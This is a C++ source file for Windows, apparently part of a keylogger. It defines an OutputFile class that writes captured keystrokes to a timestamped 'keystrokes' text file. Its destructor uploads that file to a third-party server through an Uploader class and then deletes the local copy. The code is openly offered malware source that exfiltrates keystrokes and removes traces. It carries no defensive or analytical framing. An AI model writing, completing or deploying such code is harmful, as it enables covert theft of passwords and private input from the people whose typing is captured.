#include "stdafx.h"
#include "OutputFile.h"
#include "Uploader.h"
#include <ctime>
#include <iostream>

#define FORMAT "keystrokes - %Y%m%d_%H%M%S.txt"

OutputFile::OutputFile(const char *title) {
	time_t now = time(nullptr);
	if (now != -1) {
		char temp[36];
		strftime(temp, sizeof(temp), FORMAT, localtime(&now));
		mbstowcs(fname, temp, 36);
	}
	else wcscpy(fname, L"keystrokes.txt");

	try {
		file.open(fname, std::ofstream::app);
		insert(title);
		insert(":\r\n");
	}
	catch (std::ofstream::failure oe) {
		std::cerr << "Failed to open the output file... Retrying." << std::endl;
		if (file.is_open()) {
			try {
				file.close();
			}
			catch (std::ofstream::failure ce) {}
		}
		file.open(L"keystrokes.txt", std::ofstream::out | std::ofstream::app);
		insert(title);
		insert(":\r\n");
	}
}

void OutputFile::insert(const char *ch) {
	file << ch;
}


OutputFile::~OutputFile() {
	if (file.is_open()) {
		insert("\r\n");
		try {
			file.close();
		}
		catch (std::ofstream::failure ce) {}
	}

	try {
		Uploader up = Uploader();
		up.upload(fname);								// Upload the output file to 3rd party server, if exists

		if (!DeleteFile(fname)) {						// Remove the uploaded file from the directory
			std::cerr << "Failed to delete the file from the directory. Error: " << GetLastError() << std::endl;
		}
	}
	catch (int err) {
		std::cerr << "Failed to upload output file. Error: " << err << std::endl;
	}
}